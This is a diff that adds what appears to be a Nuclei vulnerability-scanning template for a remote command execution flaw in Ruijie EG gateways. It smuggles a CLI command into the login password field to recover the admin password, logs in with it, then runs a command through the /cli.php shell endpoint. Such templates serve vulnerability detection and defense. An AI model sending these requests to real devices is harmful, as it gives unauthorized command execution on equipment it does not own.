@@ -1,0 +1,53 @@
+id: poc-yaml-ruijie-eg-cli-rce
+
+info:
+  name: poc-yaml-ruijie-eg-cli-rce
+  author: Jarcis
+  severity: high
+  tags: xray-converted,rce,ct-194311
+  reference:
+    - https://blog.csdn.net/qq_41617034/article/details/119532322
+
+http:
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=admin?show+webmaster+user
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password={{password}}
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /cli.php?a=shell HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        notdelay=true&command=expr {{rand_int(1000, 9999)}} * {{rand_int(1000, 9999)}}
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
